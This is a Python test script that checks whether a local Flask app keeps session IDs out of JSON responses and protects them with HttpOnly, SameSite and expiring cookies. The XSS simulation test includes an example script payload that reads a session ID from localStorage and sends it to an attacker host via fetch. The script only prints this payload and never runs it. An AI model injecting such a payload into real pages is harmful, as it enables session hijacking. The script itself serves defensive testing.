#!/usr/bin/env python3
"""
XSS Vulnerability Test Script
Tests if session IDs are properly protected with HttpOnly cookies
"""

import requests
import json
import re
from urllib.parse import urlparse

class XSSVulnerabilityTester:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_vulnerable_login(self):
        """Test the OLD vulnerable login flow (should fail now)"""
        print("🔍 Testing OLD vulnerable login flow...")
        
        # Try login with old expectations
        login_data = {
            "username": "admin",
            "password": "admin123"
        }
        
        try:
            response = self.session.post(
                f"{self.base_url}/auth/login",
                json=login_data,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"Status Code: {response.status_code}")
            print(f"Response Headers: {dict(response.headers)}")
            
            if response.status_code == 200:
                response_data = response.json()
                
                # Check if session_id is returned in JSON (VULNERABLE)
                if 'session_id' in response_data:
                    print("❌ VULNERABLE: Session ID returned in JSON!")
                    print(f"   Session ID: {response_data['session_id']}")
                    return True
                else:
                    print("✅ SECURE: No session ID in JSON response")
                    
                # Check if HttpOnly cookie is set
                set_cookie = response.headers.get('Set-Cookie', '')
                if 'httponly' in set_cookie.lower():
                    print("✅ SECURE: HttpOnly cookie detected")
                    return False
                else:
                    print("❌ VULNERABLE: No HttpOnly cookie!")
                    return True
            else:
                print(f"❌ Login failed: {response.text}")
                return False
                
        except Exception as e:
            print(f"❌ Error testing login: {e}")
            return False
    
    def test_cookie_based_auth(self):
        """Test the NEW secure cookie-based authentication"""
        print("\n🔍 Testing NEW secure cookie authentication...")
        
        # Test if cookies are automatically sent
        try:
            response = self.session.get(
                f"{self.base_url}/admin/users",
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                print("✅ SECURE: Cookie-based authentication works!")
                print("   Session automatically sent via HttpOnly cookie")
                return True
            elif response.status_code == 401:
                print("❌ FAILED: Authentication rejected")
                print("   Cookie not being sent or invalid")
                return False
            else:
                print(f"❌ Unexpected response: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Error testing cookie auth: {e}")
            return False
    
    def test_xss_simulation(self):
        """Simulate XSS attack attempt"""
        print("\n🔍 Simulating XSS attack...")
        
        # This simulates what an XSS attacker would try to do
        xss_payload = """
        <script>
        // Attacker trying to steal session
        var sessionId = localStorage.getItem('sessionId');
        if (sessionId) {
            fetch('https://attacker.com/steal?session=' + sessionId);
        }
        </script>
        """
        
        print("XSS Payload would try to:")
        print("1. localStorage.getItem('sessionId')")
        print("2. Send to attacker server")
        
        # Check if localStorage would contain anything
        login_response = self.session.post(
            f"{self.base_url}/auth/login",
            json={"username": "admin", "password": "admin123"},
            headers={"Content-Type": "application/json"}
        )
        
        if login_response.status_code == 200:
            response_data = login_response.json()
            
            # After secure fix, there should be no session_id in localStorage
            if 'session_id' not in response_data:
                print("✅ SECURE: No session ID in JSON for XSS to steal")
                print("   XSS attack would FAIL - nothing to steal from localStorage")
                return True
            else:
                print("❌ VULNERABLE: Session ID stealable via XSS")
                return False
        
        return False
    
    def test_csrf_protection(self):
        """Test CSRF protection via SameSite cookies"""
        print("\n🔍 Testing CSRF protection...")
        
        login_response = self.session.post(
            f"{self.base_url}/auth/login",
            json={"username": "admin", "password": "admin123"},
            headers={"Content-Type": "application/json"}
        )
        
        if login_response.status_code == 200:
            set_cookie = login_response.headers.get('Set-Cookie', '')
            
            if 'samesite=lax' in set_cookie.lower():
                print("✅ SECURE: SameSite=Lax CSRF protection detected")
                return True
            elif 'samesite=strict' in set_cookie.lower():
                print("✅ SECURE: SameSite=Strict CSRF protection detected")
                return True
            else:
                print("❌ VULNERABLE: No SameSite protection")
                print("   CSRF attacks possible")
                return False
        
        return False
    
    def test_session_expiration(self):
        """Test if sessions expire properly"""
        print("\n🔍 Testing session expiration...")
        
        login_response = self.session.post(
            f"{self.base_url}/auth/login",
            json={"username": "admin", "password": "admin123"},
            headers={"Content-Type": "application/json"}
        )
        
        if login_response.status_code == 200:
            set_cookie = login_response.headers.get('Set-Cookie', '')
            
            # Check for max-age (expiration)
            if 'max-age=' in set_cookie.lower():
                print("✅ SECURE: Session expiration detected")
                return True
            else:
                print("⚠️  WARNING: No explicit session expiration")
                return False
        
        return False
    
    def run_all_tests(self):
        """Run comprehensive security tests"""
        print("=" * 60)
        print("🛡️  XSS VULNERABILITY SECURITY TEST")
        print("=" * 60)
        
        results = {
            'vulnerable_login': self.test_vulnerable_login(),
            'cookie_auth': self.test_cookie_based_auth(),
            'xss_simulation': self.test_xss_simulation(),
            'csrf_protection': self.test_csrf_protection(),
            'session_expiration': self.test_session_expiration()
        }
        
        print("\n" + "=" * 60)
        print("📊 TEST RESULTS SUMMARY")
        print("=" * 60)
        
        security_score = 0
        total_tests = 5
        
        if not results['vulnerable_login']:
            print("✅ Session ID not exposed in JSON")
            security_score += 1
        else:
            print("❌ Session ID exposed in JSON (VULNERABLE)")
        
        if results['cookie_auth']:
            print("✅ HttpOnly cookie authentication works")
            security_score += 1
        else:
            print("❌ Cookie authentication failed")
        
        if results['xss_simulation']:
            print("✅ XSS protection working")
            security_score += 1
        else:
            print("❌ XSS vulnerability exists")
        
        if results['csrf_protection']:
            print("✅ CSRF protection enabled")
            security_score += 1
        else:
            print("❌ CSRF vulnerability exists")
        
        if results['session_expiration']:
            print("✅ Session expiration configured")
            security_score += 1
        else:
            print("⚠️  Session expiration missing")
        
        print(f"\n🎯 SECURITY SCORE: {security_score}/{total_tests}")
        
        if security_score >= 4:
            print("🛡️  STATUS: SECURE - XSS vulnerability FIXED!")
        elif security_score >= 3:
            print("⚠️  STATUS: PARTIALLY SECURE - Some improvements needed")
        else:
            print("🚨 STATUS: VULNERABLE - Major security issues exist")
        
        print("=" * 60)
        
        return security_score >= 4

def main():
    """Main test execution"""
    print("🚀 Starting XSS Vulnerability Test...")
    print("Make sure your Flask app is running on http://localhost:5000")
    print("And your React app can access http://localhost:5000 (CORS)")
    
    input("\nPress Enter to continue...")
    
    tester = XSSVulnerabilityTester()
    is_secure = tester.run_all_tests()
    
    if is_secure:
        print("\n🎉 CONGRATULATIONS! Your XSS fix is working correctly!")
        print("Session IDs are now protected with HttpOnly cookies.")
    else:
        print("\n⚠️  WARNING: Security issues detected!")
        print("Review the test results above for details.")
    
    return 0 if is_secure else 1

if __name__ == "__main__":
    exit(main())